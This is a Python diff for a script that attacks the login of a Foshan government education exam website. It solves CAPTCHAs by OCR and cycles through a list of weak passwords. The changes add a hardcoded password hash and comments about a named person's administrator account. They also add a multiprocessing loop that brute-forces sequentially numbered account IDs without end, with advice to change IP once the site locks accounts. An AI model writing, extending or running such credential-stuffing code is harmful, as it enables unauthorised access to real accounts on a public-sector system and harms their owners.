@@ -8,28 +8,27 @@ import base64
 # 懒得研究/复写他的加密算法 直接用execjs模拟
 import configparser
 import datetime
-import hashlib
 import os
 import random
 import re
 import sys
 import threading
-# from Crypto.Cipher import AES # 没能力复写JS加密 弃用
 import time
+import traceback
 from ast import literal_eval  # 字符串列表转列表
 from concurrent.futures import ThreadPoolExecutor
 from io import BytesIO
+from zkEdu import Encrypt
 
-import execjs
 # 验证码
 import pytesseract
 import requests
 from lxml import etree
 from PIL import Image
-import traceback
 
-# 加密
-from zkEdu import Encrypt
+# 加密 效率问题
+# from zkEdu import Encrypt
+
 
 class Zkweb:
 
@@ -57,7 +56,7 @@ class Zkweb:
         self.sessions = requests.session()  # 带cookies的请求
 
         self.code = None  # 验证码内容
-        self.index_url = None
+        # self.index_url = None
         self.count = 0  # 失败计数
 
     # 获取验证码地址
@@ -75,7 +74,7 @@ class Zkweb:
             return code_url
         except Exception as e:
 
-            print("页面验证码获取失败 原因:",e)
+            print("页面验证码获取失败 原因:", e)
 
             try:
                 if "系统例行维护" in resp.text:
@@ -172,14 +171,19 @@ class Zkweb:
                     pixdata[x, y] = 255
         # img.show()
         return img
-    
+
     # 登录部分 并获取主页
     def login(self, code, userid, pwd):
         url = "https://exam.edu.foshan.gov.cn/iexamfs/LoginExtMenuAction.action"
+        # 弃用 nodejs 加密 优化速度
+        # 老李账号加密后:
+        # bzr0605150806 --> r86mK3B29cysHqWSZFymJA==
+        # 随便的密码
         data = {
             "login.logintype": "basis_member",
+            # "userid": "r86mK3B29cysHqWSZFymJA==",
             "userid": Encrypt().userid(userid),
-            "password": Encrypt().pwd(pwd),
+            "password": "3b819dbfc14bd950dc14d0f9275e55c9",
             "rand": code,
         }
         try:
@@ -191,21 +195,18 @@ class Zkweb:
             resp.close()
 
         # 登录时的错误
-        print(resp.text)
-
+        # print(resp.text)
         if "输入的验证码错误" in resp.text:
             print("验证码识别有误:%s" % (code))
             return False
 
         # 可能账号密码不存在之类的
         elif "[规则]登录失败！" in resp.text:
-
             print("%s登录受限!" % (userid))
             self.count += 1
             if self.count >= 10:
                 print("账户(%s)可能被限制超过10次 请换ip" % (userid))
                 return "resqError"
-
             return False
 
         elif "登录失败，请核对您的用户名和密码！" in resp.text:
@@ -219,24 +220,20 @@ class Zkweb:
         else:
             pass
 
+
 def main(userid, pwd=None, _status=0):
-
     # 在循环外实例化对象 保留count计数器
-
     bot = Zkweb()
     if pwd != None:
         _status = 1
-
     try:
         i = 0  # 单用户请求次数计数
         PwdList = [
             "@a123456", "@abc123456", "@Aa123456", "@abc666666", "@qq123456",
             "@Aa66666"
         ]  # 弱密码列表
-
         while True:
             i += 1
-
             if _status != 1:
                 pwd = random.choice(PwdList)
             else:
@@ -251,12 +248,9 @@ def main(userid, pwd=None, _status=0):
                 continue
 
             loginStatus = bot.login(code, userid, pwd)
-
             if loginStatus == "Error":
                 # print("发生未知错误 已下载错误页面!")
-
                 break
-
             elif loginStatus == "Locking":
                 t = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                 print('''
@@ -308,4 +302,19 @@ def main(userid, pwd=None, _status=0):
 ##################################
         ''' % (userid, traceback.format_exc()))
 
-main("13543639818")
+
+# 老李的管理员账号
+# main("bzr0605150806")
+
+if __name__ == "__main__":
+
+    # 多进程部分
+    import multiprocessing
+    pool = multiprocessing.Pool(processes=5)
+
+    while True:
+        for e in range(1, 12):
+
+            for i in range(1, 7):
+                pool.apply_async(func=main, args=("bzr06051508%02d" % (e), ))
+            time.sleep(0.5)
